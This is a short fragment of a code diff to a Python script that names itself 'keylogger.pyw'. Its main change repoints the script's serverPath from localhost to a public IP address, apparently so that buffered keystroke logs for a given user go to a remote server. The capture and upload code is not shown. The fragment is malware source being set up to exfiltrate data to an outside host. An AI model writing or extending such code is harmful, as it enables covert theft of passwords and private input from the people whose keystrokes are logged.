@@ -5,9 +5,7 @@ import requests
 import json
 import sys
 
-# user = 'ashwin'
 user = ''
-# logFilePath = './'+user+'_log.out'
 logFilePath = ''
 
 MAX_BUFFER_LEN = 10
@@ -16,7 +14,7 @@ SEND_WRITE_COUNT = 3
 buffer = []
 writeCount = []
 
-serverPath = 'http://localhost:5001'
+serverPath = 'http://18.222.251.5:5001'
 
 def initialize():
   logFile = open(logFilePath, 'w')
@@ -82,7 +80,7 @@ if __name__ == "__main__":
     print("[ERROR] Invalid usage")
     print("[INFO] Correct usage: python keylogger.pyw <user>")
     exit(0)
-    
+
   user = sys.argv[1]
   logFilePath = './'+user+'_log.out'
 
